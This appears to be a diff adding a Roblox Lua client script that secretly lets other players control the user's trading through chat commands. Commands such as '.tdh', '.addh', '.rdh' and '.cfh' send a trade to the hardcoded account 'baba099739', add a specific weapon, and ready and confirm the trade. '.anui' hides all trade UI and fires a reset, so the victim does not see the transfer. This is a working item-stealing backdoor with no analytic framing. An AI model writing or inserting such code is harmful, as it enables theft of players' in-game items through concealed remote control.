@@ -1,0 +1,122 @@
+local Players = game:GetService("Players")
+local TextChatService = game:GetService("TextChatService")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+
+local player = Players.LocalPlayer
+local Net = ReplicatedStorage:WaitForChild("Modules"):WaitForChild("Net")
+
+-- =========================
+-- 🔥 HIDE TRADE UI
+-- =========================
+local function hideTradeUI()
+	local gui = player:FindFirstChild("PlayerGui")
+	if not gui then return end
+
+	for _, v in pairs(gui:GetDescendants()) do
+		if v:IsA("ScreenGui") or v:IsA("Frame") then
+
+			local name = string.lower(v.Name)
+
+			if string.find(name, "trading") or string.find(name, "trade") then
+
+				pcall(function()
+					v.Visible = false
+				end)
+
+				pcall(function()
+					v.Enabled = false
+				end)
+
+			end
+		end
+	end
+end
+
+-- =========================
+-- 🔥 LISTEN CHAT
+-- =========================
+task.spawn(function()
+	local channels = TextChatService:WaitForChild("TextChannels")
+
+	for _, channel in pairs(channels:GetChildren()) do
+		if channel:IsA("TextChannel") then
+
+			channel.MessageReceived:Connect(function(message)
+				local text = message.Text
+				if not text then return end
+
+				text = string.lower(text)
+
+				-- bỏ qua chính mình
+				if message.TextSource and message.TextSource.UserId == player.UserId then
+					return
+				end
+
+				-- =========================
+				-- 🔥 .tdh
+				-- =========================
+				if text == ".tdh" then
+					pcall(function()
+						local target = Players:FindFirstChild("baba099739")
+						if target then
+							Net:FindFirstChild("RF/Trading/SendTradeOffer"):InvokeServer(target)
+						end
+					end)
+				end
+
+				-- =========================
+				-- 🔥 .addh
+				-- =========================
+				if text == ".addh" then
+					pcall(function()
+						local args = {
+							[1] = "Weapon",
+							[2] = "771a20cbf4e544ebac"
+						}
+						Net:FindFirstChild("RF/Trading/AddItem"):InvokeServer(unpack(args))
+					end)
+				end
+
+				-- =========================
+				-- 🔥 .rdh
+				-- =========================
+				if text == ".rdh" then
+					pcall(function()
+						local args = {
+							[1] = true
+						}
+						Net:FindFirstChild("RF/Trading/SetReady"):InvokeServer(unpack(args))
+					end)
+				end
+
+				-- =========================
+				-- 🔥 .cfh
+				-- =========================
+				if text == ".cfh" then
+					pcall(function()
+						Net:FindFirstChild("RF/Trading/ConfirmTrade"):InvokeServer()
+					end)
+				end
+
+				-- =========================
+				-- 🔥 .anui
+				-- =========================
+				if text == ".anui" then
+					pcall(function()
+						hideTradeUI()
+					end)
+
+					task.delay(0.2, function()
+						pcall(function()
+							local remote = ReplicatedStorage:FindFirstChild("ResetCallBackEvent")
+							if remote then
+								remote:FireServer()
+							end
+						end)
+					end)
+				end
+
+			end)
+		end
+	end
+end)
